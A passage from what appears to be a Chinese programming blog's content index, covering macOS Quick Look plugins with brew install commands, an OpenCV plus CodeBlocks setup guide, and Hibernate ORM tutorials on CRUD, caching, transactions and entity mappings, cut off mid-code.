[手动下载](https://github.com/downloads/toland/qlmarkdown/QLMarkdown-1.3.zip)\n\n[![](https://up-img.yonghong.tech/pic/2021/07/29-16-48-QLMarkdown-iPid34.png)](https://github.com/toland/qlmarkdown)\n\n\n#### [QuickLookJSON](http://www.sagtau.com/quicklookjson.html)\n\n> 预览 JSON 文件\n\n运行 `brew cask install quicklook-json` or [手动下载](http://www.sagtau.com/media/QuickLookJSON.qlgenerator.zip)\n\n[![](https://up-img.yonghong.tech/pic/2021/07/29-16-48-QuickLookJSON-lVtWMi.png)](http://www.sagtau.com/quicklookjson.html)\n\n\n#### [QLPrettyPatch](https://github.com/atnan/QLPrettyPatch)\n\n> 预览 .patch 文件\n\n运行 `brew cask install qlprettypatch` or [手动下载](https://github.com/atnan/QLPrettyPatch/releases/latest)\n\n[![](https://up-img.yonghong.tech/pic/2021/07/29-16-49-QLPrettyPatch-BHGW6d.png)](https://github.com/atnan/QLPrettyPatch)\n\n\n#### [QuickLookCSV](https://github.com/p2/quicklook-csv)\n\n> 预览 CSV 文件\n\n运行 `brew cask install quicklook-csv` or [手动下载](http://quicklook-csv.googlecode.com/files/QuickLookCSV.dmg)\n\n[![](https://up-img.yonghong.tech/pic/2021/07/29-16-49-QuickLookCSV-984HqZ.png)](https://github.com/p2/quicklook-csv)\n\n\n#### [BetterZipQL](http://macitbetter.com/BetterZip-Quick-Look-Generator/)\n\n> 预览压缩文件\n\n运行 `brew cask install betterzipql` or [手动下载](http://macitbetter.com/BetterZipQL.zip)\n\n[![](https://up-img.yonghong.tech/pic/2021/07/29-16-49-BetterZipQL-r7v3cM.png)](http://macitbetter.com/BetterZip-Quick-Look-Generator/)\n\n\n#### [qlImageSize](https://github.com/Nyx0uf/qlImageSize)\n\n> 显示图片大小和分辨率\n\n运行 `brew cask install qlimagesize` or [手动下载](https://github.com/Nyx0uf/qlImageSize#installation)\n\n[![](https://up-img.yonghong.tech/pic/2021/07/29-16-49-qlImageSize-DvCxpH.png)](https://github.com/Nyx0uf/qlImageSize)\n\n\n#### [WebP](https://github.com/dchest/webp-quicklook)\n\n> 预览 WebP 图片\n\n运行 `brew cask install webpquicklook` or [手动下载](https://github.com/dchest/webp-quicklook/releases/latest)\n\n[![](https://up-img.yonghong.tech/pic/2021/07/29-16-50-WebP-aPTSyy.png)](https://github.com/dchest/webp-quicklook)\n\n\n#### [Suspicious Package](http://www.mothersruin.com/software/SuspiciousPackage/)\n\n> 预览 macOS App 标准安装包内容\n\n运行 `brew cask install suspicious-package` or [手动下载](http://www.mothersruin.com/software/downloads/SuspiciousPackage.xip)\n\n[![](https://up-img.yonghong.tech/pic/2021/07/29-16-50-SuspiciousPackage-03DD5k.png)](http://www.mothersruin.com/software/SuspiciousPackage/)\n\n\n#### [QuickLookASE](https://github.com/rsodre/QuickLookASE)\n\n> Preview Adobe ASE Color Swatches generated with Adobe Photoshop, Adobe Illustrator, [Adobe Color CC](https://color.adobe.com), [Spectrum](http://www.eigenlogik.com/spectrum/mac), [COLOURlovers](http://www.colourlovers.com), [Prisma](http://www.codeadventure.com), among many others.\n\n运行 `brew cask install quicklookase` or [手动下载](https://github.com/rsodre/QuickLookASE/releases/latest)\n\n[![](https://up-img.yonghong.tech/pic/2021/07/29-16-50-QuickLookASE-QL64FT.png)](https://github.com/rsodre/QuickLookASE)\n\n\n#### [QLVideo](https://github.com/Marginal/QLVideo)\n\n> 预览大多数视频文件，缩略图，封面和元数据\n\n运行 `brew cask install qlvideo` or [手动下载](https://github.com/Marginal/QLVideo/releases/latest)\n\n[![](https://up-img.yonghong.tech/pic/2021/07/29-16-51-QLVideo-2lu6IP.png)](https://github.com/Marginal/QLVideo)\n\n\n### 更多\n\n*这些不包含在 [安装全部](#install-all).*\n\n#### [ProvisionQL](https://github.com/ealeksandrov/ProvisionQL)\n\n> 预览 iOS / macOS app 和他们提供的基本信息\n\n运行 `brew cask install provisionql` or [手动下载](https://github.com/ealeksandrov/ProvisionQL/releases/latest)\n\n[![](https://up-img.yonghong.tech/pic/2021/07/29-16-51-ProvisionQL-adjoj4.png)](https://github.com/ealeksandrov/ProvisionQL)\n\n\n#### [QuickLookAPK](https://github.com/hezi/QuickLookAPK)\n\n> 预览 Android APK 文件\n\n运行 `brew cask install quicklookapk` or [手动下载](https://github.com/hezi/QuickLookAPK/blob/master/QuickLookAPK.qlgenerator.zip)\n\n[![](https://up-img.yonghong.tech/pic/2021/07/29-16-51-QuickLookAPK-g6LM6g.png)](https://github.com/hezi/QuickLookAPK)\n\n\n#### [quicklook-pat](https://github.com/pixelrowdies/quicklook-pat)\n\n> 预览 Adobe Photoshop pattern 文件\n\n运行 `brew cask install quicklook-pat` or [手动下载](https://github.com/pixelrowdies/quicklook-pat/releases)\n\n[![](https://up-img.yonghong.tech/pic/2021/07/29-16-51-quicklook-pat-lq9s09.png)](https://github.com/pixelrowdies/quicklook-pat)\n\n\n## 参考\n\n[Mac「预览」应用小技巧（一）：给你的文档添加手写签名](https://sspai.com/post/27671)\n\n[Mac「预览」应用小技巧（二）：快速调整图片尺寸](https://sspai.com/post/27674)\n\n[Mac「预览」应用小技巧（三）：PDF 文档页面重排和拼接](https://sspai.com/post/27675)\n\n[macOS + 那些强大的「预览」（Preview）插件](https://zhuanlan.zhihu.com/p/28924757)\n\n[Quick Look plugins](https://github.com/sindresorhus/quick-look-plugins)","categories":["macOS"],"tags":["macOS"]},{"title":"OpenCV + CodeBlocks 环境配置","url":"/2018/03/2018-03-23-opencv-mingw-codeblocks/","content":"\nOpenCV 在 3.X 的版本以后就不提供 MinGW 的编译版本了，所以要想用 CodeBlocks 来进行 OpenCV 的编程就需要自己手动编译 OpenCV。并且需要注意的是 OpenCV 在 3.X 的版本以后就必须使用 MinGW 的64位版本，因此用 CodeBlocks 自带的 MinGW 显然是行不通的。\n\n<!-- more -->\n\n最终我仍然没能自己编译成功。用了网上编译好的一个 OpenCV MinGW 版本。\n\n1.下载 MinGW 的 **64位版本！** **64位版本！** **64位版本！**。\n\n[tdm-gcc](http://tdm-gcc.tdragon.net/download)\n\n或者 [tdm64-gcc-5.1.0-2.exe](https://pan.lanzou.com/i0piqyd)。\n\n解压到 C:/ 根目录\n\n2.下载编译\b好的 [OpenCV 3.1版本](https://pan.lanzou.com/i0piqpe) \n\n解压到 C:/ 根目录\n\n3.将 opencv 文件夹的 x64/mingw/bin 添加到系统环境变量 \bPATH 中。\n\n4.\b更改 codeblocks 的设置\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-16-52-1-YDjKne.png)\n\nSettings -> Compiler -> Toolchain executables -> Compiler's installation directory\n\n改为 MinGW 的目录即刚刚下载的 C:\\TDM-GCC-64 \n\n保存设置 OK \n\n5.新建一个工程，\b新建工程的目的在于 OpenCV 的设置不会对其他工程产生影响。\n\nProject -> Build Options \n\n![](https://up-img.yonghong.tech/pic/2021/07/29-16-52-2-6QvXWW.png)\n\nLinker Settings 将 opencv 文件夹的 x64\\mingw\\lib 里的文件都添加进来\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-16-52-3-rgk0iM.png)\n\nSearch directories -> Compilers 把 opencv\\include 添加进来\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-16-52-4-KALj1H.png)\n\nSearch directories -> Linker 把 opencv\\x64\\mingw\\bin 添加进来\n\n保存设置 OK \n\n这种方式要求每次新建一个工程都要进行这些操作。\n\n\n\n6.测试程序\n\n将一张图片放在工程文件夹里，假设名称为 im.jpg\n\n```c++\n#include <opencv2/opencv.hpp>\nusing namespace cv;\n\nint main(int argc, char** argv) {\n    Mat image;\n    image = imread(\"./im.jpg\");\n    namedWindow(\"Display Image\", WINDOW_AUTOSIZE);\n    imshow(\"Display Image\", image);\n    waitKey(0);\n    return 0;\n}\n```\n\n运行成功 ！\n"},{"title":"Hibernate 原理及实战（二）","url":"/2018/07/2018-07-26-hibernate/","content":"\n### 1.实体类的编写规则\n\n推荐使用包装类\n\n1 实体类（称为 持久化类）\n\n有类和数据库表进行对应关系，不需要直接操作数据库表，操作实体类对象就可以了，这个类称为实体类\n\n<!-- more -->\n\n2 实体类编写规则  \n（1）实体类属性私有的  \n（2）私有属性有公开的get和set方法  \n（3）有公开无参构造方法  \n（4）要求实体类里面有一个属性和表里面主键对应  \n（5）建议：不要使用final修饰  \n（6）建议：要使用基本数据类型对应包装类  \n\n3 为什么使用包装类\n\n（1）使用包装类之后更准确表示数据\n\n（2）\n\n| 基本数据类型 | 对应包装类 |\n| ------------ | ---------- |\n| int          | Integer    |\n| char         | Character  |\n| boolean      | Boolean    |\n| float        | Float      |\n| double       | Double     |\n| short        | Short      |\n| long         | Long       |\n| byte         | Byte       |\n\n \n\n（3）举例说明\n* 比如表示学生分数 int score = 5;  表示学生得了0分int score = 0;\n** 表示学生没有参加考试int score = -1;\n* 使用包装类 Integer score = 5;   学生得了0分Integer score = 0;\n** 表示学生没有参加考试Integer score = null;\n\n### 2.主键生成策略\n\n\n1、Hibernate要求在一个实体中必须要有一个属性作为唯一值，这个唯一值一般都对应表中的主键。\n\n2、主键分类\n\n自然主键:把具有业务含义的字段作为主键，称之为自然主键。\n\n代理主键:把不具有业务含义的字段作为主键，称之为代理主键。\n\n3、主键的常见生成策略有七种\n　　　　\n　　\n\n|名称 | 描述 |\n| -- | -- |\n|increment | 用于long、short或int类型的，由Hibernate自动由递增的方式生成唯一标识符，每次增长1.只有当没有其他线程向同一张表中插入数据时使用。不能在集群情况下使用，适用于代理主键。 |\n|identity | 采用底层数据库提供的本身提供的主键生成标识符，前提是数据库必须支持自增长的数据类型。在DB2、mysql、MS SQL SERVER、Sybase和HypersonicSQL数据库中可以使用该策略，该策略要求在数据库中把主键定义为自增长，适用于代理主键。|\n|sequence |Hibernate根据底层数据库序列生成标识符。条件是数据库要支持序列，Oracle数据库可以使用该策略适用于代理主键。|\n|hilo | 通过hi/lo 算法实现的主键生成机制，需要额外的数据库表保存主键生成历史状态。|\n|native |根据底层数据库对自动生成表示符的能力来自动选择identity、sequence和hilo三种生成器中的一种。适合跨数据库平台开发，适用于代理主键。 |\n|uuid |Hibernate采用128位的UUID来生成字符，使用16进制表示，使用该策略时主键必须定义为String类型，由于其所占的空间较多，使用较少，适用于代理主键。|\n|assigned |由Java程序负责生成标识符，如果在配置文件中不配置<generator></generator>标签，则默认为该策略，适用于自然主键。|\n\n\n1 在映射配置文件中，配置实体类唯一属性值和表主键对应，class属性中有值，这个值表示生成策略，使用 native\n\n2 使用最多的native，\n\n（1）根据使用的数据库类型，自动选择使用的值\n\n（2）实体类属性类型int类型（包装类）\n\n3 经常使用值 uuid\n\n如果使用uuid值时候，实体类属性类型不能是int类型，是String类型\n\n\n### 3..对实体类的 CRUD 操作\n\n#### 3.1.添加操作\n\n前面写过了，不再重复\n\n```java\nTeacher teacher = new Teacher();\nteacher.setName(\"赵三三\");\nteacher.setSex(\"女\");\nteacher.setAddress(\"北京市海淀区\");\nteacher.setPassword(\"654321\");\n```\n\n#### 3.2.根据 id 进行查询\n\n```java\npublic void testGet() {\n    // 1.调用工具类得到 sessionFactory\n    SessionFactory sessionFactory = HibernateUtils.getSessionFactory();\n    // 2.获取 Session\n    Session session = sessionFactory.openSession();\n    // 3.开启事务\n    Transaction transaction = session.beginTransaction();\n\n    // 4.根据 id 查询\n    // 调用 session 里面的 get\n    // 第一个参数：实体类的 class\n    // 第二个参数：id 值\n    Student student = session.get(Student.class, 1);\n    System.out.println(student);\n\n    // 5.提交事务\n    transaction.commit();\n    // 6.关闭资源\n    session.close();\n}\n```\n\n#### 3.3.修改操作\n\n```java\npublic void testUpdate() {\n    // 1.调用工具类得到 sessionFactory\n    SessionFactory sessionFactory = HibernateUtils.getSessionFactory();\n    // 2.获取 Session\n    Session session = sessionFactory.openSession();\n    // 3.开启事务\n    Transaction transaction = session.beginTransaction();\n\n    // 4.修改操作\n    // 修改 id = 1 记录的 name 的值\n    // 先查\n    Student student = session.get(Student.class, 1);\n    System.out.println(student);\n    // 再改\n    student.setName(\"哈哈\");\n    // 调用 session 里的 update 方法修改(save 也可以)\n    session.update(student);\n\n    // 5.提交事务\n    transaction.commit();\n    // 6.关闭资源\n    session.close();\n}\n```\n\n#### 3.4.删除操作\n\n\n```java\npublic void testDelete() {\n    // 1.调用工具类得到 sessionFactory\n    SessionFactory sessionFactory = HibernateUtils.getSessionFactory();\n    // 2.获取 Session\n    Session session = sessionFactory.openSession();\n    // 3.开启事务\n    Transaction transaction = session.beginTransaction();\n\n    // 4.删除操作\n    // 第一种方式，根据 ID 查询出对象(建议)\n//        Student student = session.get(Student.class, 4);\n//        session.delete(student);\n    // 第二种方法\n    Student student = new Student();\n    student.setId(4);\n    session.delete(student);\n\n    // 5.提交事务\n    transaction.commit();\n    // 6.关闭资源\n    session.close();\n}\n```\n\n### 4.实体类对象状态介绍（了解）\n\n\n1 实体类对象有三种状态\n\n（0）区分状态的方式  \n实体类对象里面是否id值  \n实体类对象是否与session有关联  \n\n（1）瞬时态：没有id值，与session没有关系\n\n```java\nTeacher teacher = new Teacher();\nteacher.setName(\"赵三三\");\nteacher.setSex(\"女\");\nteacher.setAddress(\"北京市海淀区\");\nteacher.setPassword(\"654321\");\n```\n\n（2）持久态：有id值，与session有关系\n\n```java\nStudent student = session.get(Student.class, 4);\n```\n\n（3）托管态：有id值，与session没有关系\n\n```java\nStudent student = new Student();\nstudent.setId(4);\n```\n\n2 状态直接的转换  \n\n（1）瞬时态 转换 持久态 ： 调用save方法实现  \n（2）托管态 转换 持久态 ： 调用update方法实现  \n\n3 saveOrUpdate() 方法\n\n```java\n// 瞬时态，添加操作\nStudent student = new Student();\nstudent.setName(\"Jack\");\nstudent.setSex(\"男\");\nstudent.setAddress(\"河北唐山\");\nstudent.setPassword(\"hhhhhhh\");\n\nsession.saveOrUpdate(student);\n```\n\n```java\n// 实体类对象是托管态，做修改\nStudent student = new Student();\nstudent.setId(5);\nstudent.setName(\"Marry\");\nstudent.setSex(\"女\");\nstudent.setAddress(\"爱尔兰\");\nstudent.setPassword(\"gggg\");\n\nsession.saveOrUpdate(student);\n```\n\n```java\n// 持久态，执行更新操作\nStudent student = session.get(Student.class, 5);\nstudent.setName(\"李雷\");\n\nsession.saveOrUpdate(student);\n```\n\n### 5.Hibernate 的一级缓存\n\n#### 5.1.Hibernate提供两种缓存\n\n第一种 一级缓存\n\n（1）一级缓存特点：\n- 特点1： 一级缓存在hibernate操作中默认打开的，直接使用\n- 特点2： 一级缓存使用范围，是session范围，在session创建和session关闭的范围中使用一级缓存，session关闭一级缓存没有了\n- 特点3： 一级**缓存中缓存持久态数据**\n\n第二种 二级缓存（不用，替代技术 redis）\n- 不是默认开启，需要配置\n- 使用范围，SessionFactory\n\n#### 5.2.验证一级缓存的存在\n\n1.验证方式\n(1)根据 id = 1 查询，返回对象\n(2)再次根据 id = 1 查询，返回对象（\b不会查询数据库）\n\n#### 5.3.一级缓存的执行过程\n\n\n![cache](https://up-img.yonghong.tech/pic/2021/07/29-17-11-cache-m9VJIj.png)\n\n\n#### 5.4.特性(持久态自动更新数据库)\n\n不执行 session.update(user) 也可以更新。\n\n![auto-update](https://up-img.yonghong.tech/pic/2021/07/29-17-10-auto-update-BufMmO.png)\n\n\n### 6.事务代码规范写法\n\n#### 6.1.事务相关概念\n\n事务特性\n\n原子性，一致性，隔离性，持久性\n\n脏读\n不可重复读\n虚读\n\n设置事务隔离级别\n\nMySQL 默认的隔离级别 repeatable read\n\nHibernate 事务隔离级别\n\n```xml\n<property name=\"hibernate.connection.isolation\">4</property>\n```\n\n\n#### 6.2.Hibernate 事务代码规范写法\n\n\n```java\ntry {\n    // 开启事务\n    // 提交事务\n} catch () {\n    // 回滚事务\n} finally {\n    // 关闭操作\n}\n```\n\n```java\npublic void testTx() {\n    SessionFactory sessionFactory = null;\n    Session session = null;\n    Transaction transaction = null;\n    try {\n        // 开启事务\n        // 1.调用工具类得到 sessionFactory\n        sessionFactory = HibernateUtils.getSessionFactory();\n        // 2.获取 Session\n        session = sessionFactory.openSession();\n        // 3.开启事务\n        transaction = session.beginTransaction();\n\n        // 实体类对象是托管态，做修改\n        Student student = new Student();\n        student.setId(5);\n        student.setName(\"Marry\");\n        student.setSex(\"女\");\n        student.setAddress(\"爱尔兰\");\n        student.setPassword(\"gggg\");\n\n        session.saveOrUpdate(student);\n\n        // 提交事务\n        transaction.commit();\n\n    } catch (Exception e) {\n        e.printStackTrace();\n        // 回滚事务\n        transaction.rollback();\n    } finally {\n        // 关闭操作\n        session.close();\n    }\n}\n```\n\n#### 6.3.Hibernate 绑定session\n\n（1）在hibernate核心配置文件中，配置打开与本地线程绑定的session\n\n```xml\n<property name=\"hibernate.current_session_context_class\">thread</property>\n```\n\n\n（2）调用sessionFactory里面的方法得到与本地线程绑定的session\n\n```java\npublic static Session getSessionObject() {\n    return sessionFactory.getCurrentSession();\n}\n```\n\n```java\nSession session = getSessionObject();\n```\n\n（3）不需要手动关闭 session\n\n### 7.Hibernate API 的使用\n\n#### 7.1.Query 对象\n\n1 写 HQL 语句：Hibernate Query Language，hibernate提供查询语言，和普通sql很相似\n\n- （1）区别： \n    - 使用普通sql操作表和字段。\n    - 使用hql **操作实体类和属性**\n- （2）查询所有语句： from 实体类名称\n\n\n```java\n// 使用 Query 对象\n@Test\npublic void testTx() {\n    SessionFactory sessionFactory = null;\n    Session session = null;\n    Transaction transaction = null;\n    try {\n        // 开启事务\n        // 1.调用工具类得到 sessionFactory\n        sessionFactory = HibernateUtils.getSessionFactory();\n        // 2.获取 Session\n        session = sessionFactory.openSession();\n        // 3.开启事务\n        transaction = session.beginTransaction();\n\n        // 创建一个 Query 对象\n        // 方法里面写 HQL 语句\n        Query query = session.createQuery(\"from Student\");\n        // 调用 Query 对象里面的方法得到结果\n        List<Student> list = query.list();\n\n        for(Student student : list) {\n            System.out.println(student);\n        }\n\n        // 提交事务\n        transaction.commit();\n\n    } catch (Exception e) {\n        e.printStackTrace();\n        // 回滚事务\n        transaction.rollback();\n    } finally {\n        // 关闭操作\n        session.close();\n        sessionFactory.close();\n    }\n}\n```\n\n\n#### 7.2.Criteria 对象\n\n1 使用这种方式，不需要写任何语句，都是调用方法实现\n\n2 具体实现\n- 第一步 创建critica对象\n- 第二步 调用critica对象里面的方法得到结果\n\n```java\n// 创建 criteria 对象\nCriteria criteria = session.createCriteria(Student.class);\nList<Student> list = criteria.list();\nfor(Student student : list) {\n    System.out.println(student);\n}\n```\n\n\n#### 7.3.SQLquery 对象\n\n1 这种方式可以使用普通sql实现\n\n2 实现步骤\n- 第一步 创建对象\n- 第二步 调用方法得到结果\n\n返回 list 集合每部分是数组形式\n\n```java\nSQLQuery sqlQuery = session.createSQLQuery(\"select * from h_student\");\nList<Object[]> list = sqlQuery.list();\nfor(Object[] objects : list) {\n    System.out.println(Arrays.toString(objects));\n}\n```\n\n返回 list 集合每部分是对象形式\n\n```java\nSQLQuery sqlQuery = session.createSQLQuery(\"select * from h_student\");\nsqlQuery.addEntity(Student.class);\nList<Student> list = sqlQuery.list();\nfor(Student student : list) {\n    System.out.println(student);\n}\n```\n\n### 参考文献\n\n\n[Hibernate实体类编写规则和主键策略](http://www.cnblogs.com/jack1995/p/6937235.html)\n\n[Hibernate【缓存】知识要点](https://juejin.im/post/5aa148126fb9a028d4442a46)\n\n[缓存-极客学院](http://wiki.jikexueyuan.com/project/hibernate/caching.html)\n\n[Hibernate：缓存机制的学习](http://tracylihui.github.io/2015/07/20/Hibernate%EF%BC%9A%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6%E7%9A%84%E5%AD%A6%E4%B9%A0/)","categories":["Hibernate"],"tags":["Java","Hibernate"]},{"title":"Hibernate 原理及实战（三）","url":"/2018/07/2018-07-28-hibernate/","content":"\n### 一对多的操作\n\n#### 一对多映射配置\n\n以客户和联系人为例。客户是一，联系人是多。\n\n<!-- more -->\n\n第一步：创建两个实体类，客户和联系人。\n\n第二步：让两个实体类之间相互表示。\n\n（1）在客户实体类里面表示多个联系人\n\n- 一个客户里面有多个联系人\n\n```java\n// 在客户实体类里面表示多个联系人，一个客户有多个联系人\n// Hibernate 要求使用集合表示多的数据，使用 set 集合\nprivate Set<LinkMan> setLinkMan = new HashSet<LinkMan>();\npublic Set<LinkMan> getSetLinkMan() {\n    return setLinkMan;\n}\npublic void setSetLinkMan(Set<LinkMan> setLinkMan) {\n    this.setLinkMan = setLinkMan;\n}\n```\n\n（2）在联系人实体类里面表示所属客户\n\n- 一个联系人只能属于一个客户\n\n```java\n// 在联系人实体类里面表示所属客户，一个联系人只能属于一个客户\nprivate Customer customer;\npublic Customer getCustomer() {\n    return customer;\n}\npublic void setCustomer(Customer customer) {\n    this.customer = customer;\n}\n```\n\n第三步：配置映射关系\n\n（1）一般一个实体类对应一个映射文件\n\n（2）把映射最基本配置完成\n\n（3）在映射文件中，配置一对多关系\n\n- 在客户映射文件中，表示所有联系人\n\n```xml\n<!-- 在客户映射文件中，表示所有联系人\n    使用 set 标签表示所有联系人\n    set 标签里面有 name 属性\n        属性值写在客户实体类里面表示联系人的 set 集合的名称\n-->\n<set name=\"setLinkMan\">\n    <!-- 一对多建表，有外键\n        Hibernate 机制：双向维护外键，在一和多那一方都配置外键\n        column 属性值，外键名称\n    -->\n    <key column=\"clid\"></key>\n    <!-- 客户所有联系人，class 里面写联系人实体类全路径 -->\n    <one-to-many class=\"com.example.LinkMan\"/>\n</set>\n\n```\n\n- 在联系人映射文件中，表示所属客户\n\n```xml\n<!-- 表示联系人所属客户\n    name 属性：因为在联系人实体类中使用 customer 对象表示，写    customer 名称\n    class 属性：customer 全路径\n    column 属性：外键名称\n-->\n<many-to-one name=\"customer\" class=\"com.example.Customer\" column=\"clid\"></many-to-one>\n```\n\n第四部：创建核心配置文件，把映射文件引入核心配置文件中。\n\n\n#### 一对多的级联保存\n\n复杂写法\n\n```java\n// 添加一个客户，为这个客户添加一个联系人\n// 1.创建客户和联系人对象\nCustomer customer = new Customer();\ncustomer.setCustomerName(\"Google\");\ncustomer.setCustomerLevel(\"vip\");\ncustomer.setCustomerPhone(\"111\");\n\nLinkMan linkman = new LinkMan();\nlinkMan.setLinkManName(\"Lucy\");\nlinkMan.setLinkManGender(\"女\");\nlinkMan.setLinkManPhone(\"222\");\n\n// 2.在客户表示所有联系人，在联系人表示客户\n// 建立客户对象和\b联系人对象关系\n// 2.1.把联系人对象，放到客户对象的 set 集合里面\ncustomer.getSetLinkMan().add(linkman);\n// 2.2.把客户对象放到联系人里面\nlinkman.setCustomer(customer);\n\n// 3.保存\b到数据库\nsession.save(customer);\nsession.save(linkman);\n```\n\n简化写法\n\n一般根据客户添加来添加联系人\n\n第一步，在客户映射文件中进行配置\n- 在客户映射文件里面 set 标签进行配置 （cascade\b 属性）\n\n```xml\n<set name=\"setLinkMan\" cascade=\"save-update\">\n    <!-- 一对多建表，有外键\n        Hibernate 机制：双向维护外键，在一和多那一方都配置外键\n        column 属性值，外键名称\n    -->\n    <key column=\"clid\"></key>\n    <!-- 客户所有联系人，class 里面写联系人实体类全路径 -->\n    <one-to-many class=\"com.example.LinkMan\"/>\n</set>\n```\n\n第二步，创建客户和联系人对象，只需要把联系人放到客户里面就可以了，最终只需要保存客户就可以了。\n\n```java\n// 添加一个客户，为这个客户添加一个联系人\n// 1.创建客户和联系人对象\nCustomer customer = new Customer();\ncustomer.setCustomerName(\"Google\");\ncustomer.setCustomerLevel(\"vip\");\ncustomer.setCustomerPhone(\"111\");\n\nLinkMan linkman = new LinkMan();\nlinkMan.setLinkManName(\"Lucy\");\nlinkMan.setLinkManGender(\"女\");\nlinkMan.setLinkManPhone(\"222\");\n\n// 2.把联系人对象，放到客户对象的 set 集合里面\ncustomer.getSetLinkMan().add(linkman);\n\n// 3.保存\b到数据库\nsession.save(customer);\n```\n\n#### 一对多的级联删除\n\n1.删除某个客户，把客户里面\b所有的联系人删除\n\n2.具体实现\n\n第一步，在客户映射文件 set 标签进行配置\n\n- 使用属性 cascade 属性值 delete\n\n```xml\n<set name=\"setLinkMan\" cascade=\"save-update,delete\">\n    ……\n</set>\n```\n\n第二步，在代码中直接删除客户\n\n- 根据 id 查询出对象，调用 session 里面的 delete 方法删除\n\n```java\n// 根据 id 查询客户对象\nCustomer customer = session.get(Customer.class, 2);\nsession.delete(customer);\n```\n\nHibernate 内部实现：\n\n- （1）根据 id 查询客户\n- （2）根据外键查联系人\n- （3）把联系人外键设置为 null\n- （4）删除联系人和客户\n\n\n#### 一对多的修改操作\n\n1.让 Lucy 联系人所属客户不是 Google 而是 Baidu\n\n```java\nCustomer baidu = session.get(Customer.class, 1);\nLinkMan lucy = session.get(LinkMan.class, 2);\n\nbaidu.getSetLinkMan().add(lucy);\nlucy.setCustomer(baidu);\n```\n\n2.inverse 属性\n\n（1）因为 Hibernate 双向维护外键，在客户和联系人里面都需要维护外键，修改客户的时候，修改一次外键，修改联系人时候也修改一次外键。\n\n\n（2）解决方式，让其中的一方不维护外键。\n- 一对多的里面，可以让一的那一方放弃维护外键\n- 一个国家有总统，\b国家有很多人，总统不能认识国家所有人，国家所有人认识总统\n\n（3）具体实现\n在放弃关系维护映射文件中，进行配置\ninverse 属性默认值，false 不放弃关系维护。true\b 放弃关系维护\n\n```xml\n<set name=\"setLinkMan\" cascade=\"save-update,delete\" inverse=\"true\">\n    ……\n</set>\n```\n\n### 多对多的操作\n\n#### 多对多的映射配置\n\n以用户和角色为例演示\n\n\b第一步，创建实体类，用户和角色\n\n第二步，两个实体类之间互相表示\n\n（1）一个用户里面表示所有角色，使用 set 集合\n\n（2）一个角色有多个用户，\b使用 set 集合\n\n\n\n```java\npublic class User {\n    private Integer userId;\n    private String userName;\n    private String userPassword;\n\n    // 一个用户可以有多个角色\n    private Set<Role> roleSet = new HashSet<Role>();\n\n    public Integer getUserId() {\n        return userId;\n    }\n\n    public void setUserId(Integer userId) {\n        this.userId = userId;\n    }\n\n    public String getUserName() {\n        return userName;\n    }\n\n    public void setUserName(String userName) {\n        this.userName = userName;\n    }\n\n    public String getUserPassword() {\n        return userPassword;\n    }\n\n    public void setUserPassword(String userPassword) {\n        this.userPassword = userPassword;\n    }\n\n    public Set<Role> getRoleSet() {\n        return roleSet;\n    }\n\n    public void setRoleSet(Set<Role> roleSet) {\n        this.roleSet = roleSet;\n    }\n}\n```\n\n```java\npublic class Role {\n\n    private Integer roleId;\n    private String roleName;\n    private String roleMemo;\n\n    // 一个角色有多个用户\n    private Set<User> userSet = new HashSet<User>();\n\n    public Integer getRoleId() {\n        return roleId;\n    }\n\n    public void setRoleId(Integer roleId) {\n        this.roleId = roleId;\n    }\n\n    public String getRoleName() {\n        return roleName;\n    }\n\n    public void setRoleName(String roleName) {\n        this.roleName = roleName;\n    }\n\n    public String getRoleMemo() {\n        return roleMemo;\n    }\n\n    public void setRoleMemo(String roleMemo) {\n        this.roleMemo = roleMemo;\n    }\n\n    public Set<User> getUserSet() {\n        return userSet;\n    }\n\n    public void setUserSet(Set<User> userSet) {\n        this.userSet = userSet;\n    }\n\n}\n```\n\n\n\n第三步，配置映射关系\n\n（1）基本配置\n（2）配置多对多关系\n\n```xml\n<hibernate-mapping>\n    <class name=\"com.example.manytomany.User\" table=\"h_user\">\n        <id name=\"userId\">\n            <generator class=\"native\"/>\n        </id>\n        <property name=\"userName\"></property>\n        <property name=\"userPassword\"></property>\n\n        <!-- 在用户里面表示所有角色，使用 set 标签\n            name 属性：角色 set 集合的名称\n            table 属性：第三张表的名称\n        -->\n        <set name=\"roleSet\" table=\"user_role\">\n            <!-- key 标签里面配置\n                配置当前映射文件在第三张表外键名称\n            -->\n            <key column=\"userId\"></key>\n            <!-- class：角色实体类全路径\n                column：角色在第三张表外键名称\n            -->\n            <many-to-many class=\"com.example.manytomany.Role\" column=\"roleId\"></many-to-many>\n        </set>\n    </class>\n</hibernate-mapping>\n```\n\n\n```xml\n<hibernate-mapping>\n    <class name=\"com.example.manytomany.Role\" table=\"h_role\">\n        <id name=\"roleId\">\n            <generator class=\"native\"/>\n        </id>\n        <property name=\"roleName\"></property>\n        <property name=\"roleMemo\"></property>\n\n        <!-- 在角色里面表示所有用户，使用 set 标签 -->\n        <set name=\"userSet\" table=\"user_role\">\n            <!-- 角色在第三张表外键 -->\n            <key column=\"roleId\"></key>\n            <many-to-many class=\"com.example.manytomany.User\" column=\"userId\"></many-to-many>\n        </set>\n    </class>\n</hibernate-mapping>\n```\n\n\n第四步，在核心配置文件中引入映射文件\n\n```xml\n<mapping resource=\"com/example/manytomany/User.hbm.xml\"></mapping>\n<mapping resource=\"com/example/manytomany/Role.hbm.xml\"></mapping>\n```\n\n测试\n\n```sql\nHibernate: \n    \n    create table h_role (\n       roleId integer not null auto_increment,\n        roleName varchar(255),\n        roleMemo varchar(255),\n        primary key (roleId)\n    ) engine=InnoDB\nHibernate: \n    \n    create table h_user (\n       userId integer not null auto_increment,\n        userName varchar(255),\n        userPassword varchar(255),\n        primary key (userId)\n    ) engine=InnoDB\nHibernate: \n    \n    create table user_role (\n       userId integer not null,\n        roleId integer not null,\n        primary key (roleId, userId)\n    ) engine=InnoDB\nHibernate: \n    \n    alter table user_role \n       add constraint FKcq0a9hk8ih49tsd3k3utiudja \n       foreign key (roleId) \n       references h_role (roleId)\nHibernate: \n    \n    alter table user_role \n       add constraint FKrvh8yck15ehe3j6kn5k8eoknm \n       foreign key (userId) \n       references h_user (userId)\n\n```\n\n\n\n#### 多对多的级联保存\n\n根据用户保存角色\n\n第一步，在用户配置文件中 set 标签进行配置，cascade 值 save-update\n\n```xml\n<set name=\"roleSet\" table=\"user_role\" cascade=\"save-update\">\n    ……\n</set>\n```\n\n第二步\n\n```java\npublic static void main(String[] args) {\n\n    SessionFactory 